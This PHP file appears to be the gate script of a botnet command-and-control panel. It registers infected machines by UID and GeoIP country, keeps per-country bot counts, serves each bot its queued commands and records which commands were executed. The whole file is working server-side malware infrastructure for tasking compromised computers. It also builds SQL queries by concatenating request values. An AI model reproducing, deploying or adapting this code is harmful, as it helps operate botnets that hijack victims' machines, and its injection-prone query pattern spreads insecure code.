<?php
include("./inc/config.php");
include("./inc/funcs.php");
include("./geoip.inc");

function extractstr($string)
{
    return substr($string, 1, strlen($string) - 2);
}

$handle = geoip_open("GeoIP.dat", GEOIP_STANDARD);
if (isset($_POST['mode']))
{
    if ($_POST['mode'] == 1) {
        $sql = "SELECT `commands` FROM `lst_bots` WHERE `UID` = '".dRead("UID")."';";
        $res = mysql_query($sql);
        $strCommands = mysql_result($res,0);
        if ($strCommands <> "")
        {
            $arrCommands = explode("#", $strCommands);
            if (count($arrCommands) > 0)
            {
                for($p=0;$p<(count($arrCommands) -1);$p++)
                {
                    if ($arrCommands[$p] <> "")
                    {
                        $arrCommands[$p] = extractstr($arrCommands[$p]);
                        $sql = "SELECT `command` FROM `lst_commands` WHERE `ID` = '".$arrCommands[$p]."';";
                        $res = mysql_query($sql);
                        if (mysql_num_rows($res) > 0) 
                        {
                            $strCommand = mysql_result($res,0);
                            $sql = "SELECT `parameters` FROM `lst_commands` WHERE `ID` = '".$arrCommands[$p]."';";
                            $res = mysql_query($sql);
                            if (mysql_num_rows($res) > 0)
                            {
                                $strParam = mysql_result($res,0);
                                echo $arrCommands[$p]."|".$strCommand.$strParam."\n";
                            }
                        }
                        else
                        {
                            $strCommands = str_replace("[".$arrCommands[$p]."]#","",$strCommands);
                            $sql = "UPDATE `lst_bots` SET `commands` = '".$strCommands."' WHERE `UID` = '".dRead("UID")."';";
                            mysql_query($sql);
                        }
                    }
                } 
            } 
        }
    } 
    elseif ($_POST['mode'] == 2) 
    {
        $sql = "SELECT `ID` FROM `lst_bots` WHERE `UID` = '".dRead("UID")."';";
        $res = mysql_query($sql);
        if (mysql_num_rows($res) < 1) {
            $strCountry = geoip_country_name_by_addr($handle, $_SERVER['REMOTE_ADDR']);
            $strCountryCode = geoip_country_code_by_addr($handle, $_SERVER['REMOTE_ADDR']);
            if ($strCountry  == "")
            {
                $strCountry  = "Unknown";
            }
            if ($strCountryCode  == "")
            {
                $strCountryCode  = "fam";
            }
            else
            {
                $strCountryCode = strtolower($strCountryCode);
            }
            $sql = "INSERT INTO `lst_bots` (`ID`, `UID`, `country`, `commands`,`version`,`lasttime`) VALUES (NULL, '".dRead("UID")."', '".$strCountry."','', '".dRead("version")."','".time()."');";
            mysql_query($sql);
            $sql = "SELECT `ID` FROM `lst_countries` WHERE `countryname` = '".$strCountry."';";
            $res = mysql_query($sql);
            if (mysql_num_rows($res) > 0) {
                $sql = "UPDATE `lst_countries` SET `totalbots` = `totalbots` + 1 WHERE `countryname` = '".$strCountry."';";
                $res = mysql_query($sql);
            }
            else
            { 	 	 
                $sql = "INSERT INTO `lst_countries` (`ID`, `countryname`, `countrycode`, `totalbots`) VALUES (NULL, '".$strCountry."', '".$strCountryCode."', '1');";
                mysql_query($sql);
            } 
        }
        else
        {
            $sql = "UPDATE `lst_bots` SET `lasttime` = '".time()."' WHERE `UID` = '".dRead("UID")."';";
            $res = mysql_query($sql);
        }
    }
    elseif ($_POST['mode'] == 3) 
    {
        if (isset($_POST['cmdid']))
        {
            $strFullCmdList = "";
            $sql = "SELECT `commands` FROM `lst_bots` WHERE `UID` = '".dRead("UID")."';";
            $res = mysql_query($sql);
            if (mysql_num_rows($res) > 0) 
            {
                $strCommand = mysql_result($res,0);
                if ($strCommand <> "")
                {
                    $strCommand = str_replace("[".dRead("cmdid")."]#","",$strCommand);
                    $sql = "UPDATE `lst_bots` SET `commands` = '".$strCommand."' WHERE `UID` = '".dRead("UID")."';";
                    mysql_query($sql);
                    echo $strCommand;
                }
            }
            //Increase Execution
            $sql = "UPDATE `lst_commands` SET `done` = `done` + 1 WHERE `ID` = '".dRead("cmdid")."';";
            $res = mysql_query($sql);
        }
    }
}		
geoip_close($handle);
die("");
?>
